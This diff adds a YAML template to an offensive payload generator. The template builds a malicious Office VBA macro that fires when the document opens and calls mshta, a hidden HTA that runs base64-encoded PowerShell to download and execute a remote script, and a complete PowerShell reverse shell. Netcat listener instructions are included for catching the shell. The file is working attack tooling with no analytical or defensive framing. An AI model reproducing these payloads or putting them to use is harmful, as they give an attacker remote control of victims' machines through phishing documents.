@@ -1,0 +1,74 @@
+description: "VBA Macro & reverse shell for basic Powershell reverse shells via HTA"
+variables:
+  outputdir: "output/vba"
+  vbaFile: "hta-vba-powershell-command-exec.vba"
+  htaFile: "hta-vba-powershell-command-exec.hta"
+  revshellFile: "pce.txt"
+  port: 80
+  LPORT: 443
+templates:
+  macro:
+    variables:
+      command: "mshta http://{{LHOST}}:{{port}}/{{htaFile}}"
+      payload_fn: "{{ Helpers.random_str() }}"
+      wsh_fn: "{{ Helpers.random_str() }}"
+    template: |-
+      Sub {{payload_fn}}()
+        Dim {{wsh_fn}}
+        Set {{wsh_fn}} = CreateObject("Wscript.Shell")
+        {{wsh_fn}}.Run "{{command}}"
+        Set {{wsh_fn}} = Nothing
+      End Sub
+      Sub Document_Open()
+        {{payload_fn}}
+      End Sub
+      Sub AutoOpen()
+        {{payload_fn}}
+      End Sub
+  hta:
+    variables:
+      command: "iex(iwr -UseBasicParsing http://{{LHOST}}:{{port}}/{{revshellFile}})"
+      wsh_fn: "{{ Helpers.random_str() }}"
+      fso_fn: "{{ Helpers.random_str() }}"
+    template: |-
+      <script language="VBScript">
+        window.moveTo -4000, -4000
+        Set {{wsh_fn}} = CreateObject("Wscript.Shell")
+        Set {{fso_fn}} = CreateObject("Scripting.FileSystemObject")
+        For each path in Split({{wsh_fn}}.ExpandEnvironmentStrings("%PSModulePath%"),";")
+          If {{fso_fn}}.FileExists(path + "\..\powershell.exe") Then
+            {{wsh_fn}}.Run "powershell.exe -ep bypass -Sta -Nop -Window Hidden -e {{ Encoder.base64(command,Encoder.utf16le) }}",0
+            Exit For
+          End If
+        Next
+        window.close()
+      </script>
+  # revshells.com
+  revshell:
+    template: "$TCPClient = New-Object Net.Sockets.TCPClient('{{ LHOST }}', {{ LPORT }});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+print:
+- "Generating a basic VBA and powershell reverse shell to listen on {{LHOST}}:{{LPORT}}"
+- "VBA File: {{outputdir}}/{{vbaFile}}"
+- "Powershell Reverse Shell: {{outputdir}}/{{revshellFile}}"
+- mshta http://{{LHOST}}:{{port}}/{{revshellFile}}
+- |-
+  To Catch the shell
+  rlwrap nc -lvnp {{LPORT}}
+setupCommands:
+- "mkdir -p {{outputdir}}"
+- "rm -rf {{outputdir}}/{{vbaFile}}"
+- "rm -rf {{outputdir}}/{{revshellFile}}"
+- "rm -rf {{outputdir}}/{{htaFile}}"
+commands:
+- |-
+  cat << EOF >{{outputdir}}/{{htaFile}}
+  {{Templates.get('hta')}}
+  EOF
+- |-
+  cat << EOF >{{outputdir}}/{{vbaFile}}
+  {{Templates.get('macro')}}
+  EOF
+- |-
+  cat <<EOF >{{outputdir}}/{{revshellFile}}
+  {{Templates.get('revshell')}}
+  EOF
